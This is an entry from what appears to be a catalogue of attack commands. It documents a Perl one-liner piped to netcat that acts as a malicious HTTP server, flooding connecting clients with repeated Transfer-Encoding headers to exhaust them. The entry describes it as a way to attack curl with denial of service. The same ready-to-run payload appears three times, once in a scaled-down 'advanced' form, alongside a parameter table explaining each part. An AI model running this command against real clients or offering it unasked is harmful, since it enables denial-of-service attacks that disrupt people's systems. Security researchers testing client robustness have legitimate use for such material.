---
id: cmd-perl-http-server
data: >-
  perl -e 'print "HTTP/1.1 200 OK\r\n";for (my $i=0; $i < 10000000; $i++) { 
  printf "Transfer-Encoding: " . "gzip," x 20000 . "\r\n"; }' | nc -v -l -p 9999
tags:
  - dos
  - http
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:37.288Z'
verified: false
validated: true
submitted: true
---
# perl-malicious-http-server

## Command

```bash
perl -e 'print "HTTP/1.1 200 OK\r\n";for (my $i=0; $i < 10000000; $i++) {  printf "Transfer-Encoding: " . "gzip," x 20000 . "\r\n"; }' | nc -v -l -p 9999
```

## Description

This command uses a Perl one-liner to generate a massive HTTP response with repeated Transfer-Encoding headers, piped to netcat to serve it on port 9999, simulating a malicious server for curl DoS exploitation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-e` | Execute the inline Perl code | Yes |
| `print "HTTP/1.1 200 OK\r\n"` | Outputs the HTTP status line | Yes |
| `for (my $i=0; $i < 10000000; $i++)` | Loops 10 million times to generate headers | Yes |
| `printf "Transfer-Encoding: " . "gzip," x 20000 . "\r\n"` | Prints 20,000 'gzip,' repetitions per iteration with CRLF | Yes |
| `| nc -v -l -p 9999` | Pipes to netcat: verbose listen on port 9999 | Yes |

## Examples

### Basic Usage

```bash
perl -e 'print "HTTP/1.1 200 OK\r\n";for (my $i=0; $i < 10000000; $i++) {  printf "Transfer-Encoding: " . "gzip," x 20000 . "\r\n"; }' | nc -v -l -p 9999
```

### Advanced Usage

Reduce loop for testing: Replace 10000000 with 1000 and 20000 with 100 for smaller output.

```bash
perl -e 'print "HTTP/1.1 200 OK\r\n";for (my $i=0; $i < 1000; $i++) {  printf "Transfer-Encoding: " . "gzip," x 100 . "\r\n"; }' | nc -v -l -p 9999
```

## Expected Output

Netcat verbose output: 'Listening on [0.0.0.0] (family 0, port 9999)' followed by connection details when a client connects; serves gigabytes of headers.

## Related

- [[commands/curl-fetch-malicious-response]]
- [[procedures/Set-Up-Malicious-HTTP-Server-for-curl-DoS]]
